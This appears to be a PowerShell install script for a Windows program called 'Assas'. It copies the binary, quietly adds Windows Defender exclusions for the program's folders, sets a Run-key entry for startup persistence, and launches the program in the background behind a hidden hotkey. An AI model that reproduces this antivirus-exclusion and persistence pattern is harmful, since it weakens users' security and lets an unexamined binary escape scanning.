# ASSAS Windows Installation Script
# Run this script as Administrator to ensure all steps complete successfully.

$AppName = "Assas"
$InstallDir = "C:\Program Files\$AppName"
$DataDir = "C:\ProgramData\$AppName"
$BinaryName = "assas.exe"

# 1. Create Directories
Write-Host "Creating installation and data directories..." -ForegroundColor Cyan
if (!(Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir | Out-Null }
if (!(Test-Path $DataDir)) { New-Item -ItemType Directory -Path $DataDir | Out-Null }

# 2. Copy Binary (assuming script is run from the extracted zip folder)
if (Test-Path ".\$BinaryName") {
    Write-Host "Installing $BinaryName to $InstallDir..." -ForegroundColor Cyan
    Copy-Item ".\$BinaryName" -Destination "$InstallDir\$BinaryName" -Force
} else {
    Write-Warning "Could not find $BinaryName in the current directory."
}

# 3. Configure Windows Defender Exclusions (Requires Admin)
Write-Host "Adding Windows Defender exclusions for $InstallDir and $DataDir..." -ForegroundColor Cyan
try {
    Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $DataDir -ErrorAction SilentlyContinue
    Write-Host "Exclusions added successfully." -ForegroundColor Green
} catch {
    Write-Warning "Failed to add Defender exclusions. Please add them manually if the app is flagged."
}

# 4. Set Registry for Startup Persistence
Write-Host "Setting up startup persistence..." -ForegroundColor Cyan
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $RegPath -Name $AppName -Value "`"$InstallDir\$BinaryName`""

# 5. Launch the Application
Write-Host "Launching $AppName..." -ForegroundColor Cyan
Start-Process "$InstallDir\$BinaryName"

Write-Host "`nInstallation Complete! $AppName is now running in the background." -ForegroundColor Green
Write-Host "Use Ctrl+Alt+Shift+A to access the Vault." -ForegroundColor Yellow
